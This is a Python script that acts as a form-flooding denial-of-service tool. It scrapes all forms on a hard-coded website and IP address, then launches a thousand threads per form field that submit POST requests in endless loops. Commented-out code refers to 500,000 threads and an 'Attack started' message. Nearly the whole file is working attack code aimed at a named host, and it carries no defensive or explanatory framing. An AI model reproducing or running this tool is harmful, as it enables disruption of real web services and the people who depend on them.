import threading
import time
import requests
import string
import random
import socket
import sys
import json
from bs4 import BeautifulSoup
from json import dumps
from urllib.parse import urljoin

ip = '109.238.43.202'
target = ip
host = 'http://apache1.willilazarov.cz'
# number of connections that were successfull
already_connected = 0
# number of errors
errors = 0
port = 80
current_error = ''

headers = [
    "User-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.1840.71 Safari/537.36",
    "Accept-language: en-US,en"
    "User-agent: Mozilla/5.0 (Android; Linux armv7l; rv:140.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
    "User-agent: Mozilla/5.0 (Android; Linux armv7l; rv:2.0.41) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
    "User-agent: Mozilla/5.0 (Windows NT 6.0) AppleWebKit/5335.2 (KHTML, like Gecko) Chrome/152.0.874.120 Safari/535.2",
    "User-agent: Mozilla/5.0 (X11; Linux i686 on x86_364; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
    "User-agent: Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
    "User-agent: Mozilla/5.0 (X11; Linux i686; rv:14222.01) Gecko/20100101 Firefox/12.0 ",
    "User-agent: Mozilla/5.0 (X11; Linux i686; rv:2.120.1) Gecko/201003101 Firefox/4.0.1",

]
sockets = []


# unchanged
def get_forms(target_url):
    # Extract HTML source code of target website
    soup = BeautifulSoup(requests.get(target_url).content, "html.parser")
    # Find all "form" elements and return result
    return soup.find_all("form")


# unchanged
def get_form_attributes(form):
    # Define form attributes array
    form_attributes = {}
    # Get the form action attribute
    action = form.attrs.get("action")
    # Get the form method attribute
    method = form.attrs.get("method")
    # Define form input attributes and values list
    form_inputs = []
    # Iterate over all form elements (input, button, textarea) and add each attribute to list
    for form_input in form.find_all(["input", "button", "textarea"]):
        form_input_type = form_input.attrs.get("type", "text")
        form_input_name = form_input.attrs.get("name")
        form_inputs.append({"type": form_input_type, "name": form_input_name})
    # Add all attributes and values to array
    form_attributes["action"] = action
    form_attributes["method"] = method
    form_attributes["inputs"] = form_inputs
    return form_attributes


# Fillout all forms
def all_forms(url):
    target_url = url
    forms = get_forms(target_url)
    # Iterate over all forms
    for form in forms:
        # Get form attributes
        form_attributes = get_form_attributes(form)
        # Submit form
        fillout_form(form_attributes, target_url)


# Get values into forms and start threading
def fillout_form(form_attributes, target_url):
    """
    Function prepares form data and submits form
    :param form_attributes: Form input attributes with values
    :param target_url: Requested URL
    :param value: Malicious script
    :return: HTTP Response after form submission
    """
    # Construct form submission URL
    submit_url = urljoin(target_url, form_attributes["action"])
    # Get the form inputs
    form_inputs = form_attributes["inputs"]
    form_data = {}
    # Iterate over all form elements and add them values
    for form_input in form_inputs:
        if form_input["type"] == "aaaaa":
            form_input['value'] = "post"
        if form_input["type"] == "text":
            form_input["value"] = "Some text that will be inserted into fields"
        form_input_name = form_input.get("name")
        form_input_value = form_input.get("value")
        if form_input_name and form_input_value:
            # Add values to the data of form submission
            form_data[form_input_name] = form_input_value
            all_threads = []
            for i in range(1000):
                new_thread = threading.Thread(target=post_request, args=(form_attributes, submit_url, form_data,))
                # thread dies if it exits!
                new_thread.Daemon = True
                new_thread.start()
                all_threads.append(new_thread)
                # Make the main thread wait for the other threads
            for current_thread in all_threads:
                current_thread.join()
    """
    # Sends a POST request if method is post and return response
    if form_attributes["method"] == "post":
        content = requests.post(submit_url, data=form_data)
        # print(content.content.decode())
        global already_connected
        already_connected += 1
        if already_connected % 500 == 0:
            print("Connected: " + str(already_connected))
            # print(content.content.decode())
    # Sends a GET request if method is get and return response
    else:
        requests.get(submit_url, params=form_data)
    """

# Submit data in infinite loop
def post_request(form_attributes, submit_url, form):
    if form_attributes["method"] == "post":
        while True:
            try:
                content = requests.post(submit_url, data=form)
                # print(content.content.decode())
                global already_connected
                already_connected += 1
                if already_connected % 500 == 0:
                    print("Posted: " + str(already_connected))
                    #print(content.content.decode())
            except:
                global errors
                errors += 1
                if errors % 200 == 0:
                    print("Errors: " + str(errors))
                break
    # Sends a GET request if method is get and return response
    else:
        requests.get(submit_url, params=form_data)


# Generate string with lowercase letters
def get_random_string(length):
    letters = string.ascii_lowercase
    return (''.join(random.choice(letters) for i in range(length)))



if __name__ == '__main__':
    """
    #number of threads that will be created
    num_requests = 500000
    print("Attack started")
    # Spawn a thread per request
    all_threads = []
    for i in range(num_requests):
        new_thread = threading.Thread(target=login) # or use (target=dos_socket)
        # thread dies if it exits!
        new_thread.Daemon = True
        new_thread.start()
        all_threads.append(new_thread)
        # Affect requests per second
        # time.sleep(0.005)
    # Make the main thread wait for the other threads
    for current_thread in all_threads:
        current_thread.join()
    """
    ip = '109.238.43.202'  # argv1
    target = ip
    host = 'http://apache1.willilazarov.cz/'  # argv0

    all_forms(host)
